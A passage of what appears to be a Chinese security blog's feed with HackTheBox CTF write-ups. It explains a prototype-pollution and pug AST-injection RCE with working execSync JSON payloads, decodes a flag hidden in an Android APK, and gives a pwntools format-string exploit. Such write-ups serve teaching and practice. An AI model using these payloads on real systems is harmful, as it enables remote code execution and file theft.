challenge</span><br><span class="line">│   ├── flag</span><br><span class="line">│   ├── index.js</span><br><span class="line">│   ├── package.json</span><br><span class="line">│   ├── routes</span><br><span class="line">│   │   └── index.js</span><br><span class="line">│   ├── static</span><br><span class="line">│   │   ├── css</span><br><span class="line">│   │   │   └── main.css</span><br><span class="line">│   │   ├── images</span><br><span class="line">│   │   │   └── favicon.png</span><br><span class="line">│   │   └── js</span><br><span class="line">│   │       └── main.js</span><br><span class="line">│   ├── views</span><br><span class="line">│   │   └── index.html</span><br><span class="line">│   └── yarn.lock</span><br><span class="line">├── config</span><br><span class="line">│   └── supervisord.conf</span><br><span class="line">└── entrypoint.sh</span><br><span class="line"></span><br><span class="line">9 directories, 13 files</span><br></pre></td></tr></table></figure></div><p>程式碼不多，其中特別直得注意的是 index.js。</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path              = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express           = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> pug        = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; unflatten &#125;     = <span class="built_in">require</span>(<span class="string">&#x27;flat&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router            = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">&#x27;views/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/submit&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; artist &#125; = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Haigh&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Westaway&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Gingell&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line"><span class="string">&#x27;response&#x27;</span>: pug.<span class="title function_">compile</span>(<span class="string">&#x27;span Hello #&#123;user&#125;, thank you for letting us know!&#x27;</span>)(&#123; <span class="attr">user</span>: <span class="string">&#x27;guest&#x27;</span> &#125;)</span><br><span class="line">&#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line"><span class="string">&#x27;response&#x27;</span>: <span class="string">&#x27;Please provide us with the full name of an existing member.&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure></div><p>其中特別值得拿出來說明的是：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/submit&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; artist &#125; = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure></div><p>上面這段就是唯一使用者輸入的 post 請求，unflattern 則是會把平面化的資料還原成嵌套的物件，這代表 req.body 可以包含類似 <code>&#123;&quot;artist.name&quot;: &quot;Haigh&quot;&#125;</code> 這樣的平面資料，透過 unflatten 轉換成 <code>&#123; artist: &#123; name: &quot;Haigh&quot; &#125; &#125;</code>。<br>然後 <code>const &#123; artist &#125; = unflatten(req.body);</code> 會從中提取 artist 字段。<br>再來是檢查條件：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Haigh&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Westaway&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Gingell&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;response&#x27;</span>: pug.<span class="title function_">compile</span>(<span class="string">&#x27;span Hello #&#123;user&#125;, thank you for letting us know!&#x27;</span>)(&#123; <span class="attr">user</span>: <span class="string">&#x27;guest&#x27;</span> &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;response&#x27;</span>: <span class="string">&#x27;Please provide us with the full name of an existing member.&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>會檢查是否包含特定名字，符合條件就會使用 <code>pug.compile</code> 生成 HTML 內容，並傳入一個變數 user（值為 ‘guest’），產生類似 Hello guest, thank you for letting us know! 的訊息。<br>那上面提到的這兩段其實是有 Prototype Pollution 的風險，因為這段程式碼使用 unflatten 解析使用者輸入的 req.body，而如果使用者輸入了特殊鍵值（如 <strong>proto</strong> 或 constructor），在解展後可能改變 Object.prototype 的內容，造成原型污染。舉例：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 攻擊者如果輸入:</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;artist.name&quot;</span>: <span class="string">&quot;Haigh&quot;</span>,</span><br><span class="line">  <span class="string">&quot;__proto__.polluted&quot;</span>: <span class="string">&quot;malicious&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解展後的物件可能污染全域原型</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">polluted</span>); <span class="comment">// &quot;malicious&quot;</span></span><br></pre></td></tr></table></figure></div><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先我們的首要目標是要觸發 <code>pug.compile</code>，因為我們可以試圖透過 prototype pollution 讓 pug 在渲染的時候使用被我們污染的 block 物件，執行 <code>execSync()</code> 之類的指令操作。<br>所以我們可以透過 burp 去攔截 &#x2F;api&#x2F;submit 的封包，然後把 content 換成：</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(ls | grep flag)&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>然後正常來說我們是看不到輸出的，所以有些人可能會透過 reverse shell 來解這題，但這裡提供一個有趣的解法是，我們可以透過執行 <code>$(ls | grep flag)</code> 讓指令執行的結果變成不能運行的指令，然後跟著錯誤訊息印出來，舉例像是如果我們執行：</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;kazma&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>我們會得到：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Command failed: kazma&lt;br&gt;/bin/sh: kazma: not found&lt;br&gt; on line 1&lt;br&gt;</span><br></pre></td></tr></table></figure></div><p>所以在這邊 kazma 被當成指令執行，所以根成錯誤訊息印出來，同樣的我們其他指令執行的結果也會被當成無法執行的指令印出來，就可以看到輸出了，所以我們接著來拿 flag：</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(ls | grep flag)&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>我們送出上面的請求可以拿到下面的回應：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Command failed: $(ls | grep flag)&lt;br&gt;/bin/sh: flagvAbC2: not found&lt;br&gt; on line 1&lt;br&gt;</span><br></pre></td></tr></table></figure></div><p>所以檔案名稱是 <code>flagvAbC2</code>，不過我們直接 cat flag* 也可以：</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(cat flag*)&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>得到：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Command failed: $(cat flag*)&lt;br&gt;/bin/sh: HTB&#123;wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!&#125;: not found&lt;br&gt; on line 1&lt;br&gt;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/gunship_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://harshitm98.github.io/posts/htb-challenge-gunship/" >https://harshitm98.github.io/posts/htb-challenge-gunship/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;這次要來做的是一題 Web 而且有附上 Source Code 還有 Dockerfile，網站畫面很漂亮，只有一個</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="prototype-pollution" scheme="https://kazma.tw/tags/prototype-pollution/"/>
    
    <category term="ast-injection" scheme="https://kazma.tw/tags/ast-injection/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Don&#39;t Overreact Writeup</title>
    <link href="https://kazma.tw/2024/10/30/HackTheBox-Challenges-Don-t-Overreact-Writeup/"/>
    <id>https://kazma.tw/2024/10/30/HackTheBox-Challenges-Don-t-Overreact-Writeup/</id>
    <published>2024-10-30T13:34:48.008Z</published>
    <updated>2024-10-30T13:46:10.856Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>這題是 mobile 的挑戰，給了一個 .apk。<br>.apk（Android Package）是一種用於 Android 應用程式的安裝包格式，類似 Windows 上的 .exe 或是 MacOS 的 .app，包含應用程式的所有資源、原始碼和配置文件，讓我們可以在 Android 上面安裝執行。</p><p>.apk 檔案的結構基本上是壓縮檔（ZIP 格式），內部包含以下幾種重要元件：<br>1.AndroidManifest.xml：應用程式的主要配置檔，包含應用的名稱、圖示、版本資訊、所需的權限（如相機、網路）以及各種活動（Activity）、服務（Service）等。<br>2.classes.dex：包含編譯過的 Android 應用程式碼，使用的是 Dalvik 位元組碼格式，這是 Android 特有的 Java 位元組碼格式。<br>3.res&#x2F; 資料夾：包含應用的資源檔案，如 UI 佈局、圖示、圖片和字串等。<br>4.lib&#x2F; 資料夾：包含應用所需的本地函式庫檔案（如 C 或 C++ 編寫的庫），針對不同的 CPU 架構（如 ARM 或 x86）有不同的子資料夾。<br>5.META-INF&#x2F; 資料夾：包含簽章檔案，用來確保 .apk 未被篡改，保護應用的完整性和安全性。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>因為是壓縮檔我們可以先執行：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip app-release.apk -d app_release</span><br></pre></td></tr></table></figure></div><p>然後就嘗試 grep 一些關鍵字像是 htb, hackthebox 就看到下面的資訊：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ grep -ri hackthebox                                                                                              ─╯</span><br><span class="line">./assets/index.android.bundle:__d(<span class="keyword">function</span>(g,r,i,a,m,e,d)&#123;Object.defineProperty(e,<span class="string">&quot;__esModule&quot;</span>,&#123;value:!0&#125;),e.myConfig=void 0;var t=&#123;importantData:<span class="string">&quot;baNaNa&quot;</span>.toLowerCase(),apiUrl:<span class="string">&#x27;https://www.hackthebox.eu/&#x27;</span>,debug:<span class="string">&#x27;SFRCezIzbTQxbl9jNDFtXzRuZF9kMG43XzB2MzIyMzRjN30=&#x27;</span>&#125;;e.myConfig=t&#125;,400,[]);</span><br></pre></td></tr></table></figure></div><p>然後看到一串可疑的 base64：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ <span class="built_in">echo</span> <span class="string">&quot;SFRCezIzbTQxbl9jNDFtXzRuZF9kMG43XzB2MzIyMzRjN30=&quot;</span> | <span class="built_in">base64</span> -d                                              ─╯</span><br><span class="line">HTB&#123;23m41n_c41m_4nd_d0n7_0v32234c7&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/react_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;這題是 mobile 的挑戰，給了一個 .apk。&lt;br&gt;.apk（Android Package）是一種用於 An</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="android" scheme="https://kazma.tw/tags/android/"/>
    
    <category term="mobile" scheme="https://kazma.tw/tags/mobile/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges racecar Writeup</title>
    <link href="https://kazma.tw/2024/10/28/HackTheBox-Challenges-racecar-Writeup/"/>
    <id>https://kazma.tw/2024/10/28/HackTheBox-Challenges-racecar-Writeup/</id>
    <published>2024-10-28T13:32:58.318Z</published>
    <updated>2024-10-28T18:24:57.623Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>首先這題是保護全開，然後我們先跑個幾次測試之後就可以得到資訊是前面的 Name 跟 Nickname 不重要，然後我們選第一台車跑第二張圖，或是第二台車跑第一張圖就可以比較容易贏得遊戲。遊戲勝利後他會去打開 flag.txt 所以我們需要先隨便設定一個 flag.txt，但是他只會打開不會輸出出來，丟進去 ida 後就會看到這邊在最後得獎感言的部分有一個 printf 的 format string 洞如下：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( car_choice == <span class="number">1</span> &amp;&amp; (result = v9, v9 &lt; v11) || car_choice == <span class="number">2</span> &amp;&amp; (result = v9, v9 &gt; v11) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n[+] You won the race!! You get 100 coins!\n&quot;</span>, <span class="string">&quot;\x1B[1;32m&quot;</span>);</span><br><span class="line">  coins += <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Current coins: [%d]%s\n&quot;</span>, coins);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[!] Do you have anything to say to the press after your big victory?\n&gt; %s&quot;</span>, <span class="string">&quot;\x1B[0m&quot;</span>);</span><br><span class="line">  speech = <span class="built_in">malloc</span>(<span class="number">369</span>);</span><br><span class="line">  flag_file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !flag_file )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s[-] Could not open flag.txt. Please contact the creator.\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">105</span>, v5, <span class="string">&quot;\x1B[1;36m&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="number">44</span>, flag_file);</span><br><span class="line">  read(<span class="number">0</span>, speech, <span class="number">368</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(speech, v6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>所以我們可以透過 format string 印出 flag.txt 的內容，然後我們可以先透過 gdb 來看 flag 的位置然後寫出我們的 exploit 來幫我們解出 flag。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/racecar_gdb.png"                      alt="gdb"                ><br>我們本地的 flag 設定成：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;aaaabbbb&quot;</span> &gt; flag.txt</span><br></pre></td></tr></table></figure></div><p>所以他的 hex 值會是 0x6161616162626262，方便我們觀察，然後我在 gdb 輸入了 beef 可以觀察到他們的位置關係，當然我覺得直接印出來觀察也是一個不錯的方式。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.48.79&quot;</span>, <span class="number">54556</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;@&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>, <span class="number">25</span>):</span><br><span class="line">    p += <span class="string">&quot;%&#123;&#125;$p&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">p += <span class="string">&quot;#&quot;</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;Name:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;Nickname:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, p)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;@&quot;</span>)</span><br><span class="line">s = r.recvuntil(<span class="string">b&quot;#&quot;</span>).strip(<span class="string">b&quot;#&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> ss <span class="keyword">in</span> s.split(<span class="string">b&quot;0x&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> ss == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ss) // <span class="number">2</span>):</span><br><span class="line">        tmp += <span class="built_in">chr</span>(<span class="built_in">int</span>(ss[i * <span class="number">2</span> : i * <span class="number">2</span> + <span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    flag += tmp[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>執行結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Opening connection to 94.237.48.79 on port 54556: Done</span><br><span class="line">HTB&#123;why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!&#125;\x00e.7üCú÷</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/racecar_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Recon&quot;&gt;&lt;a href=&quot;#Recon&quot; class=&quot;headerlink&quot; title=&quot;Recon&quot;&gt;&lt;/a&gt;Recon&lt;/h2&gt;&lt;p&gt;首先這題是保護全開，然後我們先跑個幾次測試之後就可以得到資訊是前面的 Name 跟 Nickname 不重要，然後我</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="fmtstr" scheme="https://kazma.tw/tags/fmtstr/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Devel Writeup</title>
    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Devel-Writeup/"/>
    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Devel-Writeup/</id>
    <published>2024-10-27T11:27:24.862Z</published>
    <updated>2024-10-28T13:09:23.275Z</updated>
    
